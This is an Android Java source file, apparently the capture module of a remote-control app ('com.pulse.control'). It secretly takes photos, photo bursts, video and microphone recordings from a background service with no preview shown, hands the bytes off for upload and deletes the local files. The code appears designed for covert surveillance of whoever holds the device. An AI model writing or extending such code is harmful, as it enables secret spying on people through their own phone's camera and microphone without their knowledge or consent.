package com.pulse.control;

import android.content.Context;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.Looper;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;

/**
 * Camera photos + microphone recordings.
 * Camera1 API is used on purpose: it needs no preview surface and works
 * reliably from a background service.
 */
public final class Capture {

    public interface PhotoCb { void ok(byte[] jpeg); void err(String why); }
    public interface AudioCb { void ok(byte[] mp4, String mime); void err(String why); }

    private Capture() {}

    // ------------------------------------------------------------ camera

    private static Camera cam;

    @SuppressWarnings("deprecation")
    public static void photo(Context c, boolean front, PhotoCb cb) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                releaseQuiet();
                int idx = findCamera(front);
                if (idx < 0) { cb.err("камера не найдена"); return; }
                cam = Camera.open(idx);
                Camera.Parameters p = cam.getParameters();
                Camera.Size best = pick(p.getSupportedPictureSizes());
                if (best != null) p.setPictureSize(best.width, best.height);
                p.setJpegQuality(88);
                try { p.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE); } catch (Exception ignored) {}
                cam.setParameters(p);
                try {
                    cam.setPreviewDisplay(null);
                    cam.startPreview();
                } catch (Exception ignored) {}

                final Camera current = cam;
                cam.takePicture(null, null, (data, camera) -> {
                    try {
                        if (data != null && data.length > 0) cb.ok(data);
                        else cb.err("пустой кадр");
                    } finally {
                        try { camera.release(); } catch (Exception ignored) {}
                        cam = null;
                    }
                });
            } catch (Exception e) {
                releaseQuiet();
                cb.err(String.valueOf(e.getMessage()));
            }
        });
    }

    @SuppressWarnings("deprecation")
    private static void releaseQuiet() {
        try { if (cam != null) { cam.release(); cam = null; } } catch (Exception ignored) {}
    }

    private static int findCamera(boolean front) {
        int wantFacing = front ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
        Camera.CameraInfo info = new Camera.CameraInfo();
        for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
            Camera.getCameraInfo(i, info);
            if (info.facing == wantFacing) return i;
        }
        return Camera.getNumberOfCameras() > 0 ? 0 : -1;
    }

    private static Camera.Size pick(java.util.List<Camera.Size> sizes) {
        if (sizes == null || sizes.isEmpty()) return null;
        Camera.Size best = sizes.get(0);
        long bestScore = Long.MAX_VALUE;
        for (Camera.Size s : sizes) {
            long px = (long) s.width * s.height;
            // aim for ~2 MP: good quality, fast upload
            long score = Math.abs(px - 2_000_000L);
            if (score < bestScore) { bestScore = score; best = s; }
        }
        return best;
    }

    // ------------------------------------------------------------ camera video

    @SuppressWarnings("deprecation")
    public static void video(Context c, int seconds, AudioCb cb) {
        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
            MediaRecorder rec = null;
            File out = null;
            Camera camera = null;
            try {
                int idx = findCamera(false);
                if (idx < 0) { cb.err("нет камеры"); return; }
                camera = Camera.open(idx);
                camera.unlock();
                out = new File(c.getCacheDir(), "camvid_" + System.currentTimeMillis() + ".mp4");
                rec = new MediaRecorder();
                rec.setCamera(camera);
                rec.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
                rec.setVideoSource(MediaRecorder.VideoSource.CAMERA);
                rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                rec.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                rec.setVideoFrameRate(24);
                rec.setVideoEncodingBitRate(3_000_000);
                rec.setOutputFile(out.getAbsolutePath());
                rec.prepare();
                rec.start();
                final MediaRecorder r = rec;
                final Camera cam2 = camera;
                final File f = out;
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                    try { r.stop(); } catch (Exception ignored) {}
                    try { r.release(); } catch (Exception ignored) {}
                    try { cam2.release(); } catch (Exception ignored) {}
                    byte[] data = readAll(f);
                    try { f.delete(); } catch (Exception ignored) {}
                    if (data == null || data.length < 1000) cb.err("пустое видео");
                    else cb.ok(data, "video/mp4");
                }, Math.max(3, seconds) * 1000L);
            } catch (Exception e) {
                try { if (rec != null) rec.release(); } catch (Exception ignored) {}
                try { if (camera != null) camera.release(); } catch (Exception ignored) {}
                cb.err(String.valueOf(e.getMessage()));
            }
        });
    }

    // ------------------------------------------------------------ burst

    public interface BurstCb {
        void frame(byte[] jpeg, int n, int total);
        void done(int n);
        void err(String why);
    }

    public static void burst(Context c, int count, BurstCb cb) {
        new Thread(() -> {
            int ok = 0;
            for (int i = 1; i <= count; i++) {
                final int n = i;
                final boolean[] done = {false};
                final byte[][] shot = {null};
                photo(c, false, new PhotoCb() {
                    @Override public void ok(byte[] jpeg) { shot[0] = jpeg; synchronized (done) { done[0] = true; done.notifyAll(); } }
                    @Override public void err(String why) { synchronized (done) { done[0] = true; done.notifyAll(); } }
                });
                synchronized (done) {
                    try { done.wait(6000); } catch (InterruptedException ignored) {}
                }
                if (shot[0] != null) { ok++; cb.frame(shot[0], n, count); }
                try { Thread.sleep(800); } catch (InterruptedException ignored) {}
            }
            if (ok == 0) cb.err("камера недоступна");
            else cb.done(ok);
        }, "pulse-burst").start();
    }

    // ------------------------------------------------------------ mic

    private static MediaRecorder micRec;
    private static File micFile;
    private static Handler micHandler;
    private static Runnable micStop;

    public static void micStart(Context c, int seconds, AudioCb cb) {
        micStopNow();
        try {
            File f = new File(c.getCacheDir(), "mic_" + System.currentTimeMillis() + ".m4a");
            MediaRecorder r = new android.media.MediaRecorder();
            r.setAudioSource(MediaRecorder.AudioSource.MIC);
            r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            r.setAudioSamplingRate(44100);
            r.setAudioEncodingBitRate(96000);
            r.setOutputFile(f.getAbsolutePath());
            r.prepare();
            r.start();
            micRec = r;
            micFile = f;

            final boolean[] done = {false};
            micHandler = new Handler(Looper.getMainLooper());
            micStop = () -> {
                synchronized (done) { if (done[0]) return; done[0] = true; }
                try {
                    micRec.stop();
                } catch (Exception e) {
                    cb.err("сбой записи");
                    micStopNow();
                    return;
                }
                try { micRec.release(); } catch (Exception ignored) {}
                micRec = null;
                byte[] data = readAll(micFile);
                try { micFile.delete(); } catch (Exception ignored) {}
                if (data == null || data.length == 0) cb.err("пустая запись");
                else cb.ok(data, "audio/mp4");
            };
            micHandler.postDelayed(micStop, Math.max(1, seconds) * 1000L);
        } catch (Exception e) {
            micStopNow();
            cb.err("микрофон: " + e.getMessage());
        }
    }

    public static synchronized void micStopNow() {
        try {
            if (micHandler != null && micStop != null) micHandler.removeCallbacks(micStop);
        } catch (Exception ignored) {}
        try {
            if (micRec != null) { micRec.stop(); micRec.release(); }
        } catch (Exception ignored) {}
        micRec = null;
        try { if (micFile != null) micFile.delete(); } catch (Exception ignored) {}
        micFile = null;
    }

    static byte[] readAll(File f) {
        try (FileInputStream in = new FileInputStream(f)) {
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] buf = new byte[64 * 1024];
            int n;
            while ((n = in.read(buf)) > 0) bo.write(buf, 0, n);
            return bo.toByteArray();
        } catch (Exception e) { return null; }
    }
}
